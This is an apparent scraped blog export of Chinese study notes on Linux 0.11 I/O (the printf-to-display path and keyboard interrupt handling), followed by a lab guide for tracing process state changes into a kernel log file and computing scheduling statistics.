8 9 在linux/fs/open.c中 int sys_open(const char* filename, int flag) { i=open_namei(filename,flag,\u0026amp;inode); cuurent-\u0026gt;filp[fd]=f; //第一个空闲的fd f-\u0026gt;f_mode=inode-\u0026gt;i_mode; f-\u0026gt;f_inode=inode; f-\u0026gt;f_count=1; return fd; } 用open()把设备信息(dev/tty0)的读进来备用，open_namei根据文件名字读入inode，==inode是存放在磁盘上的设备信息==，flip存储在进程的PCB中。\n核心就是建立下面的关系： 每个进程(PCB)都有一个自己的file_table，存放inode\ninode找到了，继续完成sys_write()\n1 2 3 4 5 6 7 在linux/fs/read_write.c中 int sys_write(unsigned int fd, char *buf,int cnt) { inode = file-\u0026gt;f_inode; if(S_ISCHR(inode-\u0026gt;i_mode)) return rw_char(WRITE,inode-\u0026gt;i_zone[0], buf,cnt); ... ==根据 inode 中的信息判断该文件对应的设备是否是一个字符设备，显示器是字符设备==\n如果是字符设备，sys_write 调用函数 rw_char() 中去执行，写设备传入write，==inode-\u0026gt;i_zone[0] 中存放的就是该设备的主设备号4和次设备号0==\n1 2 3 4 5 6 7 在linux/fs/char_dev.c中 int rw_char(int rw, int dev, char *buf, int cnt) { crw_ptr call_addr=crw_table[MAJOR(dev)]; call_addr(rw, dev, buf, cnt); ... } rw_char() 函数中以主设备号（MAJOR(dev)）为索引从一个函数表 crw_table 中找到和终端设备对应的读写函数 rw_ttyx，并调用\ncrw_table定义\n1 2 static crw_ptr crw_table[]={...,rw_ttyx,}; typedef (*crw_ptr)(int rw, unsigned minor, char *buf, int count) 函数 rw_ttyx 中根据是设备读操作还是设备写操作调用相应的函数， 显示器和键盘构成了终端设备 tty，显示器只写，键盘只读\n1 2 3 4 static int rw_ttyx(int rw, unsigned minor, char *buf, int count) { return ((rw==READ)? tty_read(minor,buf): tty_write(minor,buf)); } printf是输出所以调用tty_write(minor,buf)\n1 2 3 4 5 6 7 在linux/kernel/tty_io.c中 int tty_write(unsigned channel,char *buf,int nr) { struct tty_struct *tty;tty=channel+tty_table; sleep_if_full(\u0026amp;tty-\u0026gt;write_q); //输出就是放入队列 ... } 这个函数就是实现输出的核心函数，由于CPU速度快，但是往显示器上写内容速度很慢，所以先将内容写到缓冲区里，即一个队列中，等到合适的时候，由操作系统统一将队列中的内容输出到显示器上，如果缓冲区已满，就睡眠等待\n如果没有满，继续看tty_write\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 在linux/kernel/tty_io.c中 int tty_write(unsigned channel, char *buf, int nr) { ... char c, *b=buf; while(nr\u0026gt;0\u0026amp;\u0026amp;!FULL(tty-\u0026gt;write_q)) { c = get_fs_byte(b); if(c==‘r’){PUTCH(13,tty-\u0026gt;write_q);continue;} if(O_LCUC(tty)) c = toupper(c); b++; nr--; PUTCH(c,tty-\u0026gt;write_q); } //输出完事或写队列满! tty-\u0026gt;write(tty); } 如果队列没有满，就从用户缓存区读出一个字符（==get_fs_byte()==），进行一些判断和操作后，将字符放入队列tty-\u0026gt;write_q 中（PUTCH()），如果读出的字符是 r 或 写队列满后，跳出循环。\n继续调用 tty-\u0026gt;write()\ntty_write结构体\n1 2 3 4 5 6 在include/linux/tty.h中 struct tty_struct { void (*write)(struct tty_struct *tty); struct tty_queue read_q, write_q; } 在 tty 结构体中可以看到 write 函数，根据对 tty 结构体的初始化可以看出，tty-\u0026gt;write 调用的函数是 con_write。 tty_table的定义及初始化\n1 2 3 struct tty_struct tty_table[] = { {con_write,{0,0,0,0,””},{0,0,0,0,””}},{},…}; con_write向终端写数据(内嵌汇编）\n1 2 3 4 5 6 7 8 9 10 11 12 13 在linux/kernel/chr_drv/console.c中 void con_write(struct tty_struct *tty) { GETCH(tty-\u0026gt;write_q,c); if(c\u0026gt;31\u0026amp;\u0026amp;c\u0026lt;127) { __asm__(“movb _attr,%%ahnt” “movw %%ax,%1nt”::”a”(c), ”m”(*(short*)pos):”ax”); pos+=2; } ...... } 在 con_write() 中，先从缓冲区中读取字符，然后将字符 out 到显示器上 内嵌汇编部分：\nah存储属性（颜色，闪烁），al存储字符，然后将ax里的内容out就行\n转为汇编就是mov ax,pos ，将字符打印在了显示器上（将 printf 要显示的字符放在显存的当前光标位置处，pos是显卡的寄存器\n在显示器上显示数据，只要往内存的显存中写数据即可 将pos指向显存的当前地址，可以通过con_init()和gotoxy()获取pos坐标\n如果显存和内存独立编址则用out，这里显存和内存混合编址则用mov ax, pos\n初始化以后 pos 就是开机以后当前光标所在的显存位置。\n每次输出后移两位，ax是16寄存器\n屏幕上的一个字符在显存中除了字符本身还应该有字符的属性(如颜色等) 所以，printf()输出函数整个工作过程 三、键盘输入 由于操作系统并不知道，用户什么时候会通过键盘输入数据，所以键盘的输入与中断有关\n从键盘中断开始， 从中断初始化开始\n设置键盘中断号，按下键盘会产生 0x21 号中断\n1 2 void con_init(void) //应为键盘也是console的一部分 { set_trap_gate(0x21, \u0026amp;keyboard_interrupt); } 键盘中断处理函数\n1 2 3 4 5 6 在kernel/chr_drv/keyboard.S中 .globl _keyboard_interrupt _keyboard_interrupt: inb $0x60,%al //从端口0x60读扫描吗 call key_table(,%eax,4) //调用key_table+eax*4 ... push $0 call _do_tty_interrupt 先从键盘的 0x60 端口上获得按键扫描码，然后要根据这个扫描码调用不同的处理函数 key_table()来处理各个按键\nkey_table是一个函数数组\n1 2 3 4 在kernel/chr_drv/keyboard.S中 key_table: .long none,do_self,do_self,do_self //扫描码00-03 .long do_self, ...,func, scroll, cursor ... 显示字符通常都用do_self()函数处理,其他特殊按键由func 等其他函数来处理\ndo_self 先从键盘对应的 ASCII 码表（key_map）中以当前按键的扫描码（存在寄存器 EAX 中）为索引找到当前按键的 ASCII 码\n从key_map中取出ASCII码\n1 2 3 4 #if defined(KBD_US) key_map: .byte 0,27 .ascii “1234567890-=“ ... shift_map: .byte 0,27 .ascii “!@#$%^\u0026amp;*()_+” ... #elif defined(KBD_GR) ... do_self函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 mode: .byte 0 do_self: lea alt_map,%ebx//找到映射表， 如a的key_map映射为a， 而shift_map映射为A testb $0x20,mode //alt键是否同时按下 jne 1f lea shift_map,%ebx testb $0x03,mode jne 1f lea key_map,%ebx 1: movb (%ebx,%eax),%al //扫描码索引， ASCII码àal orb %al,%al je none //没有对应的ASCII码 testb $0x4c,mode //看caps是否亮 je 2f cmpb $’a,%al jb 2f cmpb $’},%al ja 2f subb $32,%al //变大写 2:testb $??,mode //处理其他模式， 如ctrl同时按下 3:andl $0xff,%eax call put_queue none:ret 然后找到 tty 结构体中的 read_q 队列，键盘和显示器使用同一个 tty 结构体 tty_table[0]，只是键盘使用的读队列，而显示器使用的写队列\n1 2 3 4 5 6 struct tty_queue *table_list[]= { \u0026amp;tty_table[0].read_q, \u0026amp;tty_table[0].write_q; ... }; 再将 ASCII 码放到缓冲队列 read_q 中用put_queue\n1 2 3 4 put_queue: movl _table_list,%edx movl head(%edx),%ecx 1:movb %al,buf(%edx,%ecx) 将 ASCII 码放到缓冲队列 read_q 中后，可显示的字符要回显，先放在缓冲队列 write_q 中，再显示到屏幕上\n所以键盘操作的整个过程 总结 I/O读写整体框架：\nI/O读写整体三步原理\n1.cpu取址执行通过out指令向外设发送命令\n2.将命令通过文件形成统一文件视图进行解释\n3.外设执行完命令后返回给cpu进行中断处理（显示器：显示图像；键盘：读数据到内存）\n","permalink":"https://chance7bin.github.io/posts/basic/os/%E5%9B%9Bio%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/","summary":"IO设备-显示器与键盘 学习了CPU管理，进程管理，内存管理，下面就开始设备管理的学习了 一、文件视图 对于管理外设，首先我们要让外设设备工作运行","title":"四、IO设备管理"},{"content":"1.实验目的 掌握 Linux 下的多进程编程技术； 通过对进程运行轨迹的跟踪来形象化进程的概念； 在进程运行轨迹跟踪的基础上进行相应的数据统计，从而能对进程调度算法进行实际的量化评价，更进一步加深对调度和调度算法的理解，获得能在实际操作系统上对调度算法进行实验数据对比的直接经验。 2.实验内容 进程从创建（Linux 下调用 fork()）到结束的整个过程就是进程的生命期，进程在其生命期中的运行轨迹实际上就表现为进程状态的多次切换，如进程创建以后会成为就绪态；当该进程被调度以后会切换到运行态；在运行的过程中如果启动了一个文件读写操作，操作系统会将该进程切换到阻塞态（等待态）从而让出 CPU；当文件读写完毕以后，操作系统会在将其切换成就绪态，等待进程调度算法来调度该进程执行……\n本次实验包括如下内容：\n基于模板 process.c 编写多进程的样本程序，实现如下功能： 所有子进程都并行运行，每个子进程的实际运行时间一般不超过 30 秒； 父进程向标准输出打印所有子进程的 id，并在所有子进程都退出后才退出； 在 Linux0.11 上实现进程运行轨迹的跟踪。 基本任务是在内核中维护一个日志文件 /var/process.log，把从操作系统启动到系统关机过程中所有进程的运行轨迹都记录在这一 log 文件中。 在修改过的 0.11 上运行样本程序，通过分析 log 文件，统计该程序建立的所有进程的等待时间、完成时间（周转时间）和运行时间，然后计算平均等待时间，平均完成时间和吞吐量。可以自己编写统计程序，也可以使用 python 脚本程序—— stat_log.py（在 /home/teacher/ 目录下） ——进行统计。 修改 0.11 进程调度的时间片，然后再运行同样的样本程序，统计同样的时间数据，和原有的情况对比，体会不同时间片带来的差异。 /var/process.log 文件的格式必须为：\n1 pid X time 其中：\npid 是进程的 ID； X 可以是 N、J、R、W 和 E 中的任意一个，分别表示进程新建(N)、进入就绪态(J)、进入运行态(R)、进入阻塞态(W) 和退出(E)； time 表示 X 发生的时间。这个时间不是物理时间，而是系统的滴答时间(tick)； 三个字段之间用制表符分隔。例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 12 N 1056 12 J 1057 4 W 1057 12 R 1057 13 N 1058 13 J 1059 14 N 1059 14 J 1060 15 N 1060 15 J 1061 12 W 1061 15 R 1061 15 J 1076 14 R 1076 14 E 1076 ...... 3.实验报告 完成实验后，在实验报告中回答如下问题：\n结合自己的体会，谈谈从程序设计者的角度看，单进程编程和多进程编程最大的区别是什么？ 你是如何修改时间片的？仅针对样本程序建立的进程，在修改时间片前后，log 文件的统计结果（不包括 Graphic）都是什么样？结合你的修改分析一下为什么会这样变化，或者为什么没变化？ 4.实验提示 process.c 的编写涉及到 fork() 和 wait() 系统调用，请自行查阅相关文献。\n0.11 内核修改涉及到 init/main.c、kernel/fork.c 和 kernel/sched.c，开始实验前如果能详细阅读《注释》一书的相关部分，会大有裨益。\n4.1 编写样本程序 所谓样本程序，就是一个生成各种进程的程序。我们的对 0.11 的修改把系统对它们的调度情况都记录到 log 文件中。在修改调度算法或调度参数后再运行完全一样的样本程序，可以检验调度算法的优劣。\n理论上，此程序可以在任何 Unix/Linux 上运行，所以建议在 Ubuntu 上调试通过后，再拷贝到 0.11 下运行。\nprocess.c 是样本程序的模板（在 /home/teacher/ 目录下）。\n它主要实现了一个函数：\n1 2 3 4 5 6 7 8 9 /* * 此函数按照参数占用CPU和I/O时间 * last: 函数实际占用CPU和I/O的总时间，不含在就绪队列中的时间，\u0026gt;=0是必须的 * cpu_time: 一次连续占用CPU的时间，\u0026gt;=0是必须的 * io_time: 一次I/O消耗的时间，\u0026gt;=0是必须的 * 如果last \u0026gt; cpu_time + io_time，则往复多次占用CPU和I/O，直到总运行时间超过last为止 * 所有时间的单位为秒 */ cpuio_bound(int last, int cpu_time, int io_time); 下面是 4 个使用的例子：\n1 2 3 4 5 6 7 8 9 10 11 // 比如一个进程如果要占用10秒的CPU时间，它可以调用： cpuio_bound(10, 1, 0); // 只要cpu_time\u0026gt;0，io_time=0，效果相同 // 以I/O为主要任务： cpuio_bound(10, 0, 1); // 只要cpu_time=0，io_time\u0026gt;0，效果相同 // CPU和I/O各1秒钟轮回： cpuio_bound(10, 1, 1); // 较多的I/O，较少的CPU： // I/O时间是CPU时间的9倍 cpuio_bound(10, 1, 9); 修改此模板，用 fork() 建立若干个同时运行的子进程，父进程等待所有子进程退出后才退出，每个子进程按照你的意愿做不同或相同的 cpuio_bound()，从而完成一个个性化的样本程序。\n它可以用来检验有关 log 文件的修改是否正确，同时还是数据统计工作的基础。\nwait() 系统调用可以让父进程等待子进程的退出。\n小技巧：\n在 Ubuntu 下，top 命令可以监视即时的进程状态。在 top 中，按 u，再输入你的用户名，可以限定只显示以你的身份运行的进程，更方便观察。按 h 可得到帮助。\n在 Ubuntu 下，ps 命令可以显示当时各个进程的状态。ps aux 会显示所有进程；ps aux | grep xxxx 将只显示名为 xxxx 的进程。更详细的用法请问 man。\n在 Linux 0.11 下，按 F1 可以即时显示当前所有进程的状态。\n4.2 log 文件 操作系统启动后先要打开 /var/process.log，然后在每个进程发生状态切换的时候向 log 文件内写入一条记录，其过程和用户态的应用程序没什么两样。然而，因为内核状态的存在，使过程中的很多细节变得完全不一样。\n打开 log 文件\n为了能尽早开始记录，应当在内核启动时就打开 log 文件。内核的入口是 init/main.c 中的 main()（Windows 环境下是 start()），其中一段代码是：\n1 2 3 4 5 6 //…… move_to_user_mode(); if (!fork()) { /* we count on this going ok */ init(); } //…… 这段代码在进程 0 中运行，先切换到用户模式，然后全系统第一次调用 fork() 建立进程 1。进程 1 调用 init()。\n在 init()中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // …… //加载文件系统 setup((void *) \u0026amp;drive_info); // 打开/dev/tty0，建立文件描述符0和/dev/tty0的关联 (void) open(\u0026#34;/dev/tty0\u0026#34;,O_RDWR,0); // 让文件描述符1也和/dev/tty0关联 (void) dup(0); // 让文件描述符2也和/dev/tty0关联 (void) dup(0); // …… 这段代码建立了文件描述符 0、1 和 2，它们分别就是 stdin、stdout 和 stderr。这三者的值是系统标准（Windows 也是如此），不可改变。\n可以把 log 文件的描述符关联到 3。文件系统初始化，描述符 0、1 和 2 关联之后，才能打开 log 文件，开始记录进程的运行轨迹。\n为了能尽早访问 log 文件，我们要让上述工作在进程 0 中就完成。所以把这一段代码从 init() 移动到 main() 中，放在 move_to_user_mode() 之后（不能再靠前了），同时加上打开 log 文件的代码。\n修改后的 main() 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //…… move_to_user_mode(); /***************添加开始***************/ setup((void *) \u0026amp;drive_info); // 建立文件描述符0和/dev/tty0的关联 (void) open(\u0026#34;/dev/tty0\u0026#34;,O_RDWR,0); //文件描述符1也和/dev/tty0关联 (void) dup(0); // 文件描述符2也和/dev/tty0关联 (void) dup(0); (void) open(\u0026#34;/var/process.log\u0026#34;,O_CREAT|O_TRUNC|O_WRONLY,0666); /***************添加结束***************/ if (!fork()) { /* we count on this going ok */ init(); } //…… 打开 log 文件的参数的含义是建立只写文件，如果文件已存在则清空已有内容。文件的权限是所有人可读可写。\n这样，文件描述符 0、1、2 和 3 就在进程 0 中建立了。根据 fork() 的原理，进程 1 会继承这些文件描述符，所以 init() 中就不必再 open() 它们。此后所有新建的进程都是进程 1 的子孙，也会继承它们。但实际上，init() 的后续代码和 /bin/sh 都会重新初始化它们。所以只有进程 0 和进程 1 的文件描述符肯定关联着 log 文件，这一点在接下来的写 log 中很重要。\n4.3 写 log 文件 log 文件将被用来记录进程的状态转移轨迹。所有的状态转移都是在内核进行的。\n在内核状态下，write() 功能失效，其原理等同于《系统调用》实验中不能在内核状态调用 printf()，只能调用 printk()。编写可在内核调用的 write() 的难度较大，所以这里直接给出源码。它主要参考了 printk() 和 sys_write() 而写成的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #include \u0026#34;linux/sched.h\u0026#34; #include \u0026#34;sys/stat.h\u0026#34; static char logbuf[1024]; int fprintk(int fd, const char *fmt, ...) { va_list args; int count; struct file * file; struct m_inode * inode; va_start(args, fmt); count=vsprintf(logbuf, fmt, args); va_end(args); /* 如果输出到stdout或stderr，直接调用sys_write即可 */ if (fd \u0026lt; 3) { __asm__(\u0026#34;push %%fs\\n\\t\u0026#34; \u0026#34;push %%ds\\n\\t\u0026#34; \u0026#34;pop %%fs\\n\\t\u0026#34; \u0026#34;pushl %0\\n\\t\u0026#34; /* 注意对于Windows环境来说，是_logbuf,下同 */ \u0026#34;pushl $logbuf\\n\\t\u0026#34; \u0026#34;pushl %1\\n\\t\u0026#34; /* 注意对于Windows环境来说，是_sys_write,下同 */ \u0026#34;call sys_write\\n\\t\u0026#34; \u0026#34;addl $8,%%esp\\n\\t\u0026#34; \u0026#34;popl %0\\n\\t\u0026#34; \u0026#34;pop %%fs\u0026#34; ::\u0026#34;r\u0026#34; (count),\u0026#34;r\u0026#34; (fd):\u0026#34;ax\u0026#34;,\u0026#34;cx\u0026#34;,\u0026#34;dx\u0026#34;); } else /* 假定\u0026gt;=3的描述符都与文件关联。事实上，还存在很多其它情况，这里并没有考虑。*/ { /* 从进程0的文件描述符表中得到文件句柄 */ if (!(file=task[0]-\u0026gt;filp[fd])) return 0; inode=file-\u0026gt;f_inode; __asm__(\u0026#34;push %%fs\\n\\t\u0026#34; \u0026#34;push %%ds\\n\\t\u0026#34; \u0026#34;pop %%fs\\n\\t\u0026#34; \u0026#34;pushl %0\\n\\t\u0026#34; \u0026#34;pushl $logbuf\\n\\t\u0026#34; \u0026#34;pushl %1\\n\\t\u0026#34; \u0026#34;pushl %2\\n\\t\u0026#34; \u0026#34;call file_write\\n\\t\u0026#34; \u0026#34;addl $12,%%esp\\n\\t\u0026#34; \u0026#34;popl %0\\n\\t\u0026#34; \u0026#34;pop %%fs\u0026#34; ::\u0026#34;r\u0026#34; (count),\u0026#34;r\u0026#34; (file),\u0026#34;r\u0026#34; (inode):\u0026#34;ax\u0026#34;,\u0026#34;cx\u0026#34;,\u0026#34;dx\u0026#34;); } return count; } 因为和 printk 的功能近似，建议将此函数放入到 kernel/printk.c 中。fprintk() 的使用方式类同与 C 标准库函数 fprintf()，唯一的区别是第一个参数是文件描述符，而不是文件指针。\n例如：\n1 2 3 4 5 // 向stdout打印正在运行的进程的ID fprintk(1, \u0026#34;The ID of running process is %ld\u0026#34;, current-\u0026gt;pid); // 向log文件输出跟踪进程运行轨迹 fprintk(3, \u0026#34;%ld\\t%c\\t%ld\\n\u0026#34;, current-\u0026gt;pid, \u0026#39;R\u0026#39;, jiffies); 4.4 jiffies，滴答 jiffies 在 kernel/sched.c 文件中定义为一个全局变量：\n1 long volatile jiffies=0; 它记录了==从开机到当前时间的时钟中断发生次数==。在 kernel/sched.c 文件中的 sched_init() 函数中，时钟中断处理函数被设置为：\n1 set_intr_gate(0x20,\u0026amp;timer_interrupt); 而在 kernel/system_call.s 文件中将 timer_interrupt 定义为：\n1 2 3 4 5 timer_interrupt: ! …… ! 增加jiffies计数值 incl jiffies ! …… 这说明 jiffies 表示从开机时到现在发生的时钟中断次数，这个数也被称为 “滴答数”。\n另外，在 kernel/sched.c 中的 sched_init() 中有下面的代码：\n1 2 3 4 // 设置8253模式 outb_p(0x36, 0x43); outb_p(LATCH\u0026amp;0xff, 0x40); outb_p(LATCH\u0026gt;\u0026gt;8, 0x40); 这三条语句用来设置每次时钟中断的间隔，即为 LATCH，而 LATCH 是定义在文件 kernel/sched.c 中的一个宏：\n1 2 3 4 5 // 在 kernel/sched.c 中 #define LATCH (1193180/HZ) // 在 include/linux/sched.h 中 #define HZ 100 再加上 PC 机 8253 定时芯片的输入时钟频率为 1.193180MHz，即 1193180/每秒，LATCH=1193180/100，时钟每跳 11931.8 下产生一次时钟中断，即每 1/100 秒（10ms）产生一次时钟中断，所以 jiffies 实际上记录了从开机以来共经过了多少个 10ms。\n4.5 寻找状态切换点 必须找到所有发生进程状态切换的代码点，并在这些点添加适当的代码，来输出进程状态变化的情况到 log 文件中。\n此处要面对的情况比较复杂，需要对 kernel 下的 fork.c、sched.c 有通盘的了解，而 exit.c 也会涉及到。\n我们给出两个例子描述这个工作该如何做，其他情况实验者可仿照完成。\n（1）例子 1：记录一个进程生命期的开始 第一个例子是看看如何记录一个进程生命期的开始，当然这个事件就是进程的创建函数 fork()，由《系统调用》实验可知，fork() 功能在内核中实现为 sys_fork()，该“函数”在文件 kernel/system_call.s 中实现为：\n1 2 3 4 5 6 7 8 9 10 11 12 sys_fork: call find_empty_process ! …… ! 传递一些参数 push %gs pushl %esi pushl %edi pushl %ebp pushl %eax ! 调用 copy_process 实现进程创建 call copy_process addl $20,%esp 所以真正实现进程创建的函数是 copy_process()，它在 kernel/fork.c 中定义为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int copy_process(int nr,……) { struct task_struct *p; // …… // 获得一个 task_struct 结构体空间 p = (struct task_struct *) get_free_page(); // …… p-\u0026gt;pid = last_pid; // …… // 设置 start_time 为 jiffies p-\u0026gt;start_time = jiffies; // …… /* 设置进程状态为就绪。所有就绪进程的状态都是 TASK_RUNNING(0），被全局变量 current 指向的 是正在运行的进程。*/ p-\u0026gt;state = TASK_RUNNING; return last_pid; } 因此要完成进程运行轨迹的记录就要在 copy_process() 中添加输出语句。\n这里要输出两种状态，分别是“N（新建）”和“J（就绪）”。\n（2）例子 2：记录进入睡眠态的时间 第二个例子是记录进入睡眠态的时间。sleep_on() 和 interruptible_sleep_on() 让当前进程进入睡眠状态，这两个函数在 kernel/sched.c 文件中定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 void sleep_on(struct task_struct **p) { struct task_struct *tmp; // …… tmp = *p; // 仔细阅读，实际上是将 current 插入“等待队列”头部，tmp 是原来的头部 *p = current; // 切换到睡眠态 current-\u0026gt;state = TASK_UNINTERRUPTIBLE; // 让出 CPU schedule(); // 唤醒队列中的上一个（tmp）睡眠进程。0 换作 TASK_RUNNING 更好 // 在记录进程被唤醒时一定要考虑到这种情况，实验者一定要注意!!! if (tmp) tmp-\u0026gt;state=0; } /* TASK_UNINTERRUPTIBLE和TASK_INTERRUPTIBLE的区别在于不可中断的睡眠 * 只能由wake_up()显式唤醒，再由上面的 schedule()语句后的 * * if (tmp) tmp-\u0026gt;state=0; * * 依次唤醒，所以不可中断的睡眠进程一定是按严格从“队列”（一个依靠 * 放在进程内核栈中的指针变量tmp维护的队列）的首部进行唤醒。而对于可 * 中断的进程，除了用wake_up唤醒以外，也可以用信号（给进程发送一个信 * 号，实际上就是将进程PCB中维护的一个向量的某一位置位，进程需要在合 * 适的时候处理这一位。感兴趣的实验者可以阅读有关代码）来唤醒，如在 * schedule()中： * * for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) * if (((*p)-\u0026gt;signal \u0026amp; ~(_BLOCKABLE \u0026amp; (*p)-\u0026gt;blocked)) \u0026amp;\u0026amp; * (*p)-\u0026gt;state==TASK_INTERRUPTIBLE) * (*p)-\u0026gt;state=TASK_RUNNING;//唤醒 * * 就是当进程是可中断睡眠时，如果遇到一些信号就将其唤醒。这样的唤醒会 * 出现一个问题，那就是可能会唤醒等待队列中间的某个进程，此时这个链就 * 需要进行适当调整。interruptible_sleep_on和sleep_on函数的主要区别就 * 在这里。 */ void interruptible_sleep_on(struct task_struct **p) { struct task_struct *tmp; … tmp=*p; *p=current; repeat: current-\u0026gt;state = TASK_INTERRUPTIBLE; schedule(); // 如果队列头进程和刚唤醒的进程 current 不是一个， // 说明从队列中间唤醒了一个进程，需要处理 if (*p \u0026amp;\u0026amp; *p != current) { // 将队列头唤醒，并通过 goto repeat 让自己再去睡眠 (**p).state=0; goto repeat; } *p=NULL; //作用和 sleep_on 函数中的一样 if (tmp) tmp-\u0026gt;state=0; } 相信实验者已经找到合适的地方插入记录进程从运行到睡眠的语句了。\n总的来说，Linux 0.11 支持四种进程状态的转移：就绪到运行、运行到就绪、运行到睡眠和睡眠到就绪，此外还有新建和退出两种情况。其中就绪与运行间的状态转移是通过 schedule()（它亦是调度算法所在）完成的；运行到睡眠依靠的是 sleep_on() 和 interruptible_sleep_on()，还有进程主动睡觉的系统调用 sys_pause() 和 sys_waitpid()；睡眠到就绪的转移依靠的是 wake_up()。所以只要在这些函数的适当位置插入适当的处理语句就能完成进程运行轨迹的全面跟踪了。\n为了让生成的 log 文件更精准，以下几点请注意： 进程退出的最后一步是通知父进程自己的退出，目的是唤醒正在等待此事件的父进程。从时序上来说，应该是子进程先退出，父进程才醒来。 schedule() 找到的 next 进程是接下来要运行的进程（注意，一定要分析清楚 next 是什么）。如果 next 恰好是当前正处于运行态的进程，swith_to(next) 也会被调用。这种情况下相当于当前进程的状态没变。 系统无事可做的时候，进程 0 会不停地调用 sys_pause()，以激活调度算法。此时它的状态可以是等待态，等待有其它可运行的进程；也可以叫运行态，因为它是唯一一个在 CPU 上运行的进程，只不过运行的效果是等待。 4.6 管理 log 文件 日志文件的管理与代码编写无关，有几个要点要注意：\n每次关闭 bochs 前都要执行一下 sync 命令，它会刷新 cache，确保文件确实写入了磁盘。 在 0.11 下，可以用 ls -l /var 或 ll /var 查看 process.log 是否建立，及它的属性和长度。 一定要实践《实验环境的搭建与使用》一章中关于文件交换的部分。最终肯定要把 process.log 文件拷贝到主机环境下处理。 在 0.11 下，可以用 vi /var/process.log 或 more /var/process.log 查看整个 log 文件。不过，还是拷贝到 Ubuntu 下看，会更舒服。 在 0.11 下，可以用 tail -n NUM /var/process.log 查看 log 文件的最后 NUM 行。 一种可能的情况下，得到的 process.log 文件的前几行是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 1 N 48 //进程1新建（init()）。此前是进程0建立和运行，但为什么没出现在log文件里？ 1 J 49 //新建后进入就绪队列 0 J 49 //进程0从运行-\u0026gt;就绪，让出CPU 1 R 49 //进程1运行 2 N 49 //进程1建立进程2。2会运行/etc/rc脚本，然后退出 2 J 49 1 W 49 //进程1开始等待（等待进程2退出） 2 R 49 //进程2运行 3 N 64 //进程2建立进程3。3是/bin/sh建立的运行脚本的子进程 3 J 64 2 E 68 //进程2不等进程3退出，就先走一步了 1 J 68 //进程1此前在等待进程2退出，被阻塞。进程2退出后，重新进入就绪队列 1 R 68 4 N 69 //进程1建立进程4，即shell 4 J 69 1 W 69 //进程1等待shell退出（除非执行exit命令，否则shell不会退出） 3 R 69 //进程3开始运行 3 W 75 4 R 75 5 N 107 //进程5是shell建立的不知道做什么的进程 5 J 108 4 W 108 5 R 108 4 J 110 5 E 111 //进程5很快退出 4 R 111 4 W 116 //shell等待用户输入命令。 0 R 116 //因为无事可做，所以进程0重出江湖 4 J 239 //用户输入命令了，唤醒了shell 4 R 239 4 W 240 0 R 240 …… 4.7 数据统计 为展示实验结果，需要编写一个数据统计程序，它从 log 文件读入原始数据，然后计算平均周转时间、平均等待时间和吞吐率。\n任何语言都可以编写这样的程序，实验者可自行设计。我们用 python 语言编写了一个——stat_log.py（这是 python 源程序，可以用任意文本编辑器打开）。\npython 是一种跨平台的脚本语言，号称 “可执行的伪代码”，非常强大，非常好用，也非常有用，建议闲着的时候学习一下。\n其解释器免费且开源，Ubuntu 下这样安装：\n1 2 # 在实验楼的环境中已经安装了 python，可以不必进行此操作 $ sudo apt-get install python 然后只要给 stat_log.py 加上执行权限（使用的命令为 chmod +x stat_log.py）就可以直接运行它。\n此程序必须在命令行下加参数执行，直接运行会打印使用说明。\n1 2 3 4 5 6 7 8 9 10 11 Usage: ./stat_log.py /path/to/process.log [PID1] [PID2] ... [-x PID1 [PID2] ... ] [-m] [-g] Example: # Include process 6, 7, 8 and 9 in statistics only. (Unit: tick) ./stat_log.py /path/to/process.log 6 7 8 9 # Exclude process 0 and 1 from statistics. (Unit: tick) ./stat_log.py /path/to/process.log -x 0 1 # Include process 6 and 7 only. (Unit: millisecond) ./stat_log.py /path/to/process.log 6 7 -m # Include all processes and print a COOL \u0026#34;graphic\u0026#34;! (Unit: tick) ./stat_log.py /path/to/process.log -g 运行 ./stat_log.py process.log 0 1 2 3 4 5 -g（只统计 PID 为 0、1、2、3、4 和 5 的进程）的输出示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 (Unit: tick) Process Turnaround Waiting CPU Burst I/O Burst 0 75 67 8 0 1 2518 0 1 2517 2 25 4 21 0 3 3003 0 4 2999 4 5317 6 51 5260 5 3 0 3 0 Average: 1823.50 12.83 Throughout: 0.11/s -----===\u0026lt; COOL GRAPHIC OF SCHEDULER \u0026gt;===----- [Symbol] [Meaning] ~~~~~~~~~~~~~~~~~~~~~~~~~~~ number PID or tick \u0026#34;-\u0026#34; New or Exit \u0026#34;#\u0026#34; Running \u0026#34;|\u0026#34; Ready \u0026#34;:\u0026#34; Waiting / Running with \u0026#34;+\u0026#34; -| Ready \\and/or Waiting -----===\u0026lt; !!!!!!!!!!!!!!!!!!!!!!!!! \u0026gt;===----- 40 -0 41 #0 42 # 43 # 44 # 45 # 46 # 47 # 48 |0 -1 49 | :1 -2 50 | : #2 51 | : # 52 | : # 53 | : # 54 | : # 55 | : # 56 | : # 57 | : # 58 | : # 59 | : # 60 | : # 61 | : # 62 | : # 63 | : # 64 | : |2 -3 65 | : | #3 66 | : | # 67 | : | # ………… 小技巧：如果命令行程序输出过多，可以用 command arguments | more （command arguments 需要替换为脚本执行的命令）的方式运行，结果会一屏一屏地显示。\n“more” 在 Linux 和 Windows 下都有。Linux 下还有一个 “less”，和 “more” 类似，但功能更强，可以上下翻页、搜索。\n注：log文件需要知道的一些知识\n操作系统-CPU调度\nCPU Burst：CPU区间\nI/O 